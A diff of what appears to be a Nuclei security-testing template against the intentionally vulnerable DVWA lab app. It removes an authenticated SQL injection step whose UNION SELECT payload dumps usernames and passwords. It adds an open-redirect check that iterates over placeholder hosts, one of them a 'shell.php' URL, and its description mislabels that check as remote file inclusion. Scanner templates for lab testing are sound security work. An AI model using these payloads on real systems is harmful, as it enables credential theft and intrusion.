@@ -1,19 +1,26 @@
-id: dvwa-sqli-authenticated-low-sec
+id: web-open-http-redirect-simulated-low-sec
 
 info:
-  name: DVWA SQLi - low sec (Authenticated)
+  name: Web Open HTTP Redirection Simulated
   author: Dylan Shield (Shieldia.co)
-  severity: high
-  description: Attempts to exploit SQLi on DVWA after authentication.
-  reference:
-    - https://github.com/digininja/DVWA
-  tags: dvwa,sqli
+  severity: info
+  description: Simulates Remote File Inclustion
+  tags: dvwa,open-http-redirect
 
 variables:
   password: "password"
   username: "admin"
+  remote_servers:
+    - "http://example.home.arpa/shell.php"
+    - "example.home.arpa"
+    - "127.0.0.1"
 
-flow: http(1) && http(2) && http(3)
+flow: |
+  http(1) && http(2)
+  for (let remote_server of iterate(template["remote_servers"])) {
+    set("remote_server", remote_server);
+    http(3);
+  }
 
 http:
   # Step 1: Authenticate as admin and get PHPSESSID and user_token
@@ -53,34 +60,9 @@ http:
 
         security=low&seclev_submit=Submit&user_token={{token}}
 
-  # Step 3: Execute SQLi
   - raw:
       - |
-        GET /DVWA/vulnerabilities/sqli/?id=1'+UNION+SELECT+user%2C+password+FROM+users%3B--+-&Submit=Submit# HTTP/1.1
+        GET /DVWA/vulnerabilities/open_redirect/source/low.php?redirect={{remote_server}} HTTP/1.1
         Host: {{Hostname}}
         Accept: */*
         Connection: close
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: regex
-        name: "Multiple occurrences of ID: 1"
-        part: body
-        regex:
-          - "(ID: 1.*){2,}"
-    extractors:
-      - type: regex
-        name: query_in
-        part: request
-        internal: true
-        group: 1
-        regex:
-          - "id=(.*)&"
-        
-      - type: dsl
-        name: input
-        dsl:
-          - "url_decode(query_in)"
